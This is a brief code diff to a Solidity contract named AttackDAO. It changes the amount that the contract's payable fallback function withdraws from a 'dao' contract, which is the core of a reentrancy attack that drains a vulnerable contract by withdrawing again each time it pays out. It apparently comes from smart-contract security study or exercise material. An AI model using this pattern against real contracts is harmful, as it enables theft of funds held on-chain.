@@ -32,6 +32,6 @@ contract AttackDAO {
   */
 
   function () public payable {
-    dao.withdraw(1 ether);
+    dao.withdraw(10000);
   }
 }
